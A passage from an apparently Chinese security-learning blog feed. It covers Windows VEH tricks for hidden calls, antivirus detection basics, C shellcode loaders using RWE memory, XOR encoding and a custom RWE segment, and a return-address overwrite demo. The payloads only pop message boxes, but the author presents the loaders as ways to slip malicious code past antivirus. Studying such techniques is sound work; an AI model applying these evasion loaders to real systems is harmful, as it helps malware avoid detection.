(val-&gt;ExceptionRecord-&gt;ExceptionCode == STATUS_BREAKPOINT)</span><br><span class="line">{</span><br><span class="line">Decshellcode();<span class="comment">//执行shellcode</span></span><br><span class="line"><span class="comment">//修改EIP</span></span><br><span class="line">val-&gt;ContextRecord-&gt;Eip = (DWORD)&amp;llcode;</span><br><span class="line"><span class="comment">//表示成功处理，让程序继续执行</span></span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//继续往下搜索异常处理函数</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,off)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//创建VEH，当第一个参数不为0，则异常处理函数是第一个要调用的处理程序。如果参数为0，则处理程序是要调用的最后一个处理程序</span></span><br><span class="line"><span class="comment">//第二个参数是一个异常处理函数</span></span><br><span class="line">AddVectoredExceptionHandler(<span class="number">1</span>, ExceptionHandle);</span><br><span class="line"><span class="keyword">int</span> bilibili = <span class="number">2020</span>;</span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">2</span>] = { <span class="number">1</span>,<span class="number">2</span> };</span><br><span class="line"><span class="keyword">int</span> ti = <span class="number">23</span>;</span><br><span class="line">arr[<span class="number">5</span>] = (<span class="keyword">int</span>)&amp;llcode;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,on)</span></span><br></pre></td></tr></tbody></table></figure><p><img src="/2022/04/10/VEH/1649639633494.png" alt=""></p><p>这里修改EIP为我们的Print()函数，因为函数名表示的就是函数地址，所以就是让他执行我们的Print函数</p><h1 id="0x03-VEH实现隐藏函数调用"><a class="header-anchor" href="#0x03-VEH实现隐藏函数调用">¶</a>0x03-VEH实现隐藏函数调用</h1><p>我们知道函数调用时，会先把call的地址压入栈中，而在函数内部的返回ret指令就是从栈中取出call指令的下一条地址</p><p>所以我们可以对栈中的地址进行修改让其调用我们的函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showflag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">MessageBoxA(<span class="number">0</span>, <span class="string">"this is flag"</span>, <span class="string">"flag"</span>, MB_OK);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> _stdcall <span class="title">ExceptionHandler</span><span class="params">(PEXCEPTION_POINTERS val)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//将EIP也就是下一条执行的指令修改为ret</span></span><br><span class="line">val-&gt;ContextRecord-&gt;Eip += <span class="number">6</span>;</span><br><span class="line"><span class="comment">//降低栈顶</span></span><br><span class="line">val-&gt;ContextRecord-&gt;Esp -= <span class="number">4</span>;</span><br><span class="line"><span class="comment">//入栈,将ret下一条指令压入栈中</span></span><br><span class="line">*(<span class="keyword">int</span>*)val-&gt;ContextRecord-&gt;Esp = val-&gt;ContextRecord-&gt;Eip + <span class="number">1</span>;</span><br><span class="line"><span class="comment">//和上面一样，这次修改为我们想要执行的地址</span></span><br><span class="line">val-&gt;ContextRecord-&gt;Esp -= <span class="number">4</span>;</span><br><span class="line">*(<span class="keyword">int</span>*)val-&gt;ContextRecord-&gt;Esp=*(<span class="keyword">int</span>*)(val-&gt;ContextRecord-&gt;Ebp<span class="number">-8</span>);</span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">AddVectoredExceptionHandler(<span class="number">1</span>, ExceptionHandler);</span><br><span class="line">DWORD a = (DWORD)showflag;</span><br><span class="line"><span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> c;</span><br><span class="line">c=a / k;<span class="comment">//构造除0异常</span></span><br><span class="line">__asm</span><br><span class="line">{</span><br><span class="line">ret</span><br><span class="line">}</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Get flag!!!"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>具体的可以先看汇编</p><p><img src="/2022/04/10/VEH/1649645606291.png" alt=""></p><p>触发除零异常后，PEXCEPTION_POINTERS val会接收此时的信息</p><p>我们先将EIP修改为ret指令，然后将ret下一条指令压入栈中，再把我们要调用的函数压入栈，这时候栈的结构为</p><p><img src="/2022/04/10/VEH/1649645936725.png" alt=""></p><p>返回值为EXCEPTION_CONTINUE_EXECUTION，表示继续往下执行，这时候EIP是ret指令，取出栈顶元素，跳转过去，执行完我们的shellcode后也存在ret，此时的栈为</p><p><img src="/2022/04/10/VEH/1649646048618.png" alt=""></p><p>shellcode尾部的ret取出栈顶的值，跳转过去，回到我们正常的程序</p><blockquote><p>修改EIP的时候也可以</p><figure class="highlight xl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">val</span>-&gt;</span>C<span class="function"><span class="title">ontextRecord</span>-&gt;</span>E<span class="function"><span class="title">ip</span> = (DWORD)val-&gt;</span>E<span class="function"><span class="title">xceptionRecord</span>-&gt;</span>ExceptionAddress+<span class="number">6</span>;</span><br></pre></td></tr></tbody></table></figure><p>ExceptionRecord-&gt;ExceptionAddress是触发异常的地址</p><p>ExceptionRecord-&gt;ExceptionCode表示异常的类型</p></blockquote><p>异常类型</p><p><img src="/2022/04/10/VEH/1649646418174.png" alt=""></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;VEH&lt;/p&gt;</summary>
    
    
    
    
    <category term="Windows" scheme="https://gift1a.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>shellcode知识</title>
    <link href="https://gift1a.github.io/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/"/>
    <id>https://gift1a.github.io/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/</id>
    <published>2022-04-10T01:12:25.000Z</published>
    <updated>2022-04-20T05:29:09.167Z</updated>
    
    <content type="html"><![CDATA[<p>shellcode</p><span id="more"></span> <h1 id="0x00-Shellcode"><a class="header-anchor" href="#0x00-Shellcode">¶</a>0x00-Shellcode</h1><p>什么是shellcode</p><blockquote><p>在计算机安全中，shellcode是一小段代码，可以用于软件漏洞利用的载荷。被称为“shellcode”是因为它通常启动一个命令终端，攻击者可以通过这个终端控制受害的计算机，但是所有执行类似任务的代码片段都可以称作shellcode。Shellcode通常是以机器码形式编写的，所以我们要学习硬编码</p></blockquote><h1 id="0x01-杀毒软件甄别病毒的技术原理"><a class="header-anchor" href="#0x01-杀毒软件甄别病毒的技术原理">¶</a>0x01-杀毒软件甄别病毒的技术原理</h1><h2 id="基于特征进行甄别"><a class="header-anchor" href="#基于特征进行甄别">¶</a>基于特征进行甄别</h2><p>主要是病毒以前留下的信息，基于这些信息，我们可以判断存在病毒。</p><p>我们知道在PE文件中的.text段存放的是可执行代码，而杀毒软件会将其内容读取出来，并进行程序特征提取，判断可执行代码中是否存在病毒的特征，有的话就确定该程序存在病毒。</p><p>这也就是为什么病毒还未运行就被发现的原因。</p><h2 id="基于病毒的行为进行甄别"><a class="header-anchor" href="#基于病毒的行为进行甄别">¶</a>基于病毒的行为进行甄别</h2><p>主要是针对病毒行为的敏感操作，当病毒想干坏事的时候，难免会调用API，当出现比较敏感的操作时，确定该程序为病毒。</p><h1 id="0x03-一个简单的Loader"><a class="header-anchor" href="#0x03-一个简单的Loader">¶</a>0x03-一个简单的Loader</h1><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>  shellcode[] =</span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75"</span></span><br><span class="line"><span class="string">"\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD"</span></span><br><span class="line"><span class="string">"\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE"</span></span><br><span class="line"><span class="string">"\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24"</span></span><br><span class="line"><span class="string">"\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03"</span></span><br><span class="line"><span class="string">"\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9"</span></span><br><span class="line"><span class="string">"\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61"</span></span><br><span class="line"><span class="string">"\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//分配内存，并设置为可读可写可执行，大小为shellcode的大小</span></span><br><span class="line">LPVOID Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (Memory == <span class="literal">NULL</span>)<span class="comment">//当开辟失败时，直接结束</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//将shellcode复制到内存中</span></span><br><span class="line"><span class="built_in">memcpy</span>(Memory, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"><span class="comment">/*DWORD dold;</span></span><br><span class="line"><span class="comment">VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, NULL);*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//强制转换为函数</span></span><br><span class="line">((<span class="keyword">void</span>(*)())Memory)();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行时会直接弹出消息框</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649555515604.png" alt=""></p><p>整个过程就是先开辟内存（注意要注意属性），然后将shellcode复制到内存中，再将我们复制的数据强制转换为函数并进行调用。这些行为和特征都是没有什么问题的，所以如果我们插入的是恶意代码，是可以绕过杀毒软件的。</p><h1 id="0x04-优化Loader"><a class="header-anchor" href="#0x04-优化Loader">¶</a>0x04-优化Loader</h1><h2 id="内存分配优化"><a class="header-anchor" href="#内存分配优化">¶</a>内存分配优化</h2><p>因为数据本身就占有内存，所以不需要重新进行分配，直接使用即可</p><h2 id="改变属性"><a class="header-anchor" href="#改变属性">¶</a>改变属性</h2><p>因为数据存储于数据段中，而我们要让其可以执行，则需要改变其属性为可执行</p><blockquote><p>0xC000005报错表示内存访问的属性问题</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">VirtualProtect</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD  flNewProtect,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>第一个参数是地址起始位置</p><p>第二个参数是需要改变的内存大小</p><p>第三个参数是想要改变的属性</p><p>主要有</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/42dad68bad2c64271524c48a96f3822.png" alt=""></p><p>第四个参数</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649556346133.png" alt=""></p><p>所以我们要让他指向有效变量，而不能是NULL</p><h2 id="最终效果-v3"><a class="header-anchor" href="#最终效果-v3">¶</a>最终效果</h2><p>不知道为什么使用这种方法在VS会报错-无法强制转换</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649556539202.png" alt=""></p><h1 id="0x05-更进一步"><a class="header-anchor" href="#0x05-更进一步">¶</a>0x05-更进一步</h1><p>因为上一步将内存的属性修改并执行，那么一定会审计我们的shellcode，如果shellcode存在恶意的行为，很快就会被辨别出来，所以我们要对其进行加密，使其无法被识别。当然要注意要进行解密操作。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">"vdata"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>  shellcode[] =</span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75"</span></span><br><span class="line"><span class="string">"\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD"</span></span><br><span class="line"><span class="string">"\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE"</span></span><br><span class="line"><span class="string">"\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24"</span></span><br><span class="line"><span class="string">"\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03"</span></span><br><span class="line"><span class="string">"\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9"</span></span><br><span class="line"><span class="string">"\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61"</span></span><br><span class="line"><span class="string">"\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3"</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()<span class="comment">//创建段，名称为vdata</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">"/SECTION:vdata,RWE"</span>)<span class="comment">//修改段的属性</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//加密函数</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(shellcode); ++i)</span><br><span class="line">{</span><br><span class="line">shellcode[i] ^= <span class="number">0x23</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//分配内存，并设置为可读可写可执行，大小为shellcode的大小</span></span><br><span class="line">LPVOID Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (Memory == <span class="literal">NULL</span>)<span class="comment">//当开辟失败时，直接结束</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//将shellcode复制到内存中</span></span><br><span class="line"><span class="built_in">memcpy</span>(Memory, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"><span class="comment">//解密函数</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(shellcode); ++i)</span><br><span class="line">{</span><br><span class="line">*((<span class="keyword">char</span>*)Memory + i) ^= <span class="number">0x23</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">////DWORD dold;</span></span><br><span class="line"><span class="comment">////VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &amp;dold);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">////强制转换为函数</span></span><br><span class="line">((<span class="keyword">void</span>(*)())Memory)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>因为杀毒软件可能将代码上传到云端跑（因为存在一些敏感行为，VirtualProtect等），这时候我们的shellcode可能被识别，所以我们要避免VirtualProtect操作，那么如何创建可读可写可执行的段呢。这时候就用到了预处理#pragma</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">"vdata"</span>)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>  shellcode[] =</span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75"</span></span><br><span class="line"><span class="string">"\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD"</span></span><br><span class="line"><span class="string">"\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE"</span></span><br><span class="line"><span class="string">"\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24"</span></span><br><span class="line"><span class="string">"\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03"</span></span><br><span class="line"><span class="string">"\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9"</span></span><br><span class="line"><span class="string">"\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61"</span></span><br><span class="line"><span class="string">"\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3"</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()<span class="comment">//创建段，名称为vdata</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">"/SECTION:vdata,RWE"</span>)<span class="comment">//修改段的属性</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//分配内存，并设置为可读可写可执行，大小为shellcode的大小</span></span><br><span class="line">LPVOID Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (Memory == <span class="literal">NULL</span>)<span class="comment">//当开辟失败时，直接结束</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//将shellcode复制到内存中</span></span><br><span class="line"><span class="built_in">memcpy</span>(Memory, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"><span class="comment">//DWORD dold;</span></span><br><span class="line"><span class="comment">//VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &amp;dold);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//强制转换为函数</span></span><br><span class="line">((<span class="keyword">void</span>(*)())Memory)();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="效果展示-v2"><a class="header-anchor" href="#效果展示-v2">¶</a>效果展示</h2><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649557566937.png" alt=""></p><h1 id="0x06-栈溢出"><a class="header-anchor" href="#0x06-栈溢出">¶</a>0x06-栈溢出</h1><h2 id="栈溢出基础"><a class="header-anchor" href="#栈溢出基础">¶</a>栈溢出基础</h2><p>首先要先了解X86栈和函数调用的机制</p><p>首先先把call的下一条地址压入栈中，再把ebp压入栈，最后提升栈底，也就是mov ebp,esp，而函数内部的变量起始地址是ebp-0x04，依次往后，当给变量赋值过大的值时，可能会覆盖函数结束时ret的值，进而执行我们的shellcode</p><blockquote><p>数组的赋值是从低地址往高地址赋值</p></blockquote><p>所以我们可以通过数组越界覆盖ret原本的地址</p><p>代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decshellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//完成恶意代码的释放、解密、执行</span></span><br><span class="line">MessageBoxA(<span class="number">0</span>, <span class="string">"不要再打了"</span>, <span class="string">"我错了"</span>, MB_OK);</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,off)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">2022</span>;<span class="comment">//0</span></span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">2</span>] = { <span class="number">1</span>,<span class="number">2</span> };<span class="comment">//1,2</span></span><br><span class="line"><span class="keyword">int</span> ti = <span class="number">23</span>;<span class="comment">//3</span></span><br><span class="line">arr[<span class="number">5</span>] = (<span class="keyword">int</span>)Decshellcode;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,on)</span></span><br></pre></td></tr></tbody></table></figure><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649578699864.png" alt=""></p><p>这里会先把0xD61212压入栈中</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649578767663.png" alt=""></p><p>然后将ebp的值压入栈</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649578844982.png" alt="ebp入栈"></p><p>提升栈底就不看了，来看变量的赋值过程，可以看到是从栈底往低地址压入的</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649579064005.png" alt=""></p><p><strong>数组入栈</strong></p><p><img 